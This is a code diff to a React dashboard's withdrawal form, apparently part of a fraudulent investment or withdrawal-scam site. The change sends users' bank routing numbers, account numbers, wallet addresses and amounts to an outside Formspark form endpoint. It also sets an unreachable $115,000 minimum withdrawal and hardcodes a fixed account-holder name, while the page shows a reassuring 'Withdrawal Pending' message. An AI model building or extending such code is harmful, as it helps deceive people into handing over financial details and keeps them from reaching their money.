@@ -680,13 +680,49 @@ export default function Dashboard() {
                 <span className="text-white">Current balance: ${balance}</span>
               </p>
             ) : (
-              <>
+              <form
+                action="https://submit.formspark.io/Uw0FopiGT" // replace with your Formspark form ID
+                method="POST"
+                onSubmit={(e) => {
+                  e.preventDefault();
+
+                  if (Number(withdrawAmount) < 115000) {
+                    setWithdrawMessage("The minimum withdrawal is $115,000.");
+                    setShowWithdrawPopup(true);
+                    return;
+                  }
+
+                  if (Number(withdrawAmount) > balance) {
+                    setWithdrawMessage(
+                      "You do not have enough funds to withdraw that amount.",
+                    );
+                    setShowWithdrawPopup(true);
+                    return;
+                  }
+
+                  setWithdrawMessage(
+                    `Withdrawal Pending! Will take up to 24 hours or more depending on the status of recipient\nMethod: ${
+                      withdrawType === "wallet"
+                        ? selectedWallet
+                        : selectedBank === "custom"
+                          ? customBank
+                          : selectedBank
+                    }\nAccount/Wallet: ${
+                      withdrawType === "wallet" ? walletAddress : accountNumber
+                    }\nAmount: ${withdrawAmount}`,
+                  );
+                  setShowWithdrawPopup(true);
+
+                  e.target.submit(); // ✅ send to Formspark
+                }}
+              >
                 {/* Bank / Wallet Selection */}
                 <div className="mb-4 text-left">
                   <label className="block text-gray-300 font-medium mb-2">
                     Select Withdrawal Type
                   </label>
                   <select
+                    name="withdrawType" // ✅ Formspark field
                     value={withdrawType}
                     onChange={(e) => setWithdrawType(e.target.value)}
                     className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -705,6 +741,7 @@ export default function Dashboard() {
                         Select Bank
                       </label>
                       <select
+                        name="bank" // ✅ Formspark field
                         value={selectedBank}
                         onChange={(e) => setSelectedBank(e.target.value)}
                         className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -726,6 +763,7 @@ export default function Dashboard() {
                         </label>
                         <input
                           type="text"
+                          name="customBank" // ✅ Formspark field
                           value={customBank}
                           onChange={(e) => setCustomBank(e.target.value)}
                           className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -739,6 +777,7 @@ export default function Dashboard() {
                       </label>
                       <input
                         type="text"
+                        name="accountName" // ✅ Formspark field
                         value="Marvin Lane O'Dell"
                         readOnly
                         className="w-full px-4 py-2 rounded bg-gray-600 text-white cursor-not-allowed"
@@ -751,6 +790,7 @@ export default function Dashboard() {
                       </label>
                       <input
                         type="text"
+                        name="routingNumber" // ✅ Formspark field
                         value={routingNumber}
                         onChange={(e) => setRoutingNumber(e.target.value)}
                         className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -763,6 +803,7 @@ export default function Dashboard() {
                       </label>
                       <input
                         type="text"
+                        name="accountNumber" // ✅ Formspark field
                         value={accountNumber}
                         onChange={(e) => setAccountNumber(e.target.value)}
                         className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -775,6 +816,7 @@ export default function Dashboard() {
                       </label>
                       <input
                         type="number"
+                        name="amount" // ✅ Formspark field
                         value={withdrawAmount}
                         onChange={(e) => setWithdrawAmount(e.target.value)}
                         className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -791,6 +833,7 @@ export default function Dashboard() {
                         Select Wallet
                       </label>
                       <select
+                        name="wallet" // ✅ Formspark field
                         value={selectedWallet}
                         onChange={(e) => setSelectedWallet(e.target.value)}
                         className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -811,6 +854,7 @@ export default function Dashboard() {
                           </label>
                           <input
                             type="text"
+                            name="walletAddress" // ✅ Formspark field
                             value={walletAddress}
                             onChange={(e) => setWalletAddress(e.target.value)}
                             className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -823,6 +867,7 @@ export default function Dashboard() {
                           </label>
                           <input
                             type="number"
+                            name="amount" // ✅ Formspark field
                             value={withdrawAmount}
                             onChange={(e) => setWithdrawAmount(e.target.value)}
                             className="w-full px-4 py-2 rounded bg-gray-700 text-white"
@@ -835,67 +880,12 @@ export default function Dashboard() {
 
                 {/* ✅ Confirm Button (last tag) */}
                 <button
-                  onClick={() => {
-                    if (Number(withdrawAmount) < 115000) {
-                      setWithdrawMessage("The minimum withdrawal is $115,000.");
-                      setShowWithdrawPopup(true);
-                      return;
-                    }
-
-                    if (Number(withdrawAmount) > balance) {
-                      setWithdrawMessage(
-                        "You do not have enough funds to withdraw that amount.",
-                      );
-                      setShowWithdrawPopup(true);
-                      return;
-                    }
-
-                    setWithdrawMessage(
-                      `Withdrawal Pending! Will take up to 24 hours or more depending on the status of recipient\nMethod: ${
-                        withdrawType === "wallet"
-                          ? selectedWallet
-                          : selectedBank === "custom"
-                            ? customBank
-                            : selectedBank
-                      }\nAccount/Wallet: ${
-                        withdrawType === "wallet"
-                          ? walletAddress
-                          : accountNumber
-                      }\nAmount: ${withdrawAmount}`,
-                    );
-                    setShowWithdrawPopup(true);
-
-                    setShowWithdraw(false);
-                    setSelectedBank("");
-                    setCustomBank("");
-                    setRoutingNumber("");
-                    setAccountNumber("");
-                    setSelectedWallet("");
-                    setWalletAddress("");
-                    setWithdrawAmount("");
-                  }}
+                  type="submit"
                   className="px-6 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition"
                 >
                   Confirm Withdrawal
                 </button>
-
-                {/* ✅ Popup Modal (always available) */}
-                {showWithdrawPopup && (
-                  <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
-                    <div className="bg-white rounded-lg shadow-lg p-6 max-w-sm w-full text-center">
-                      <p className="mb-6 whitespace-pre-line text-gray-800">
-                        {withdrawMessage}
-                      </p>
-                      <button
-                        onClick={() => setShowWithdrawPopup(false)}
-                        className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
-                      >
-                        Close
-                      </button>
-                    </div>
-                  </div>
-                )}
-              </>
+              </form>
             )}
           </div>
         </div>
